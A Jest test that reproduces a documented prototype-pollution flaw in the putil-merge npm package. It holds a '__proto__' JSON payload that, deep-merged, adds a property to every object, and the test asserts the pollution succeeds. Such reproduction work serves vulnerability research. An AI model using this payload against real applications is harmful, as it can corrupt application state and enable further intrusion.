//https://security.snyk.io/vuln/SNYK-JS-PUTILMERGE-1317077
test("prototype pollution in putil-merge", () => {
  const putil_merge = require("putil-merge");
  const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  var obj = {};

  expect({}.polluted).toBe(undefined);

  putil_merge(obj, payload, { deep: true });

  expect({}.polluted).toBe("yes");
});
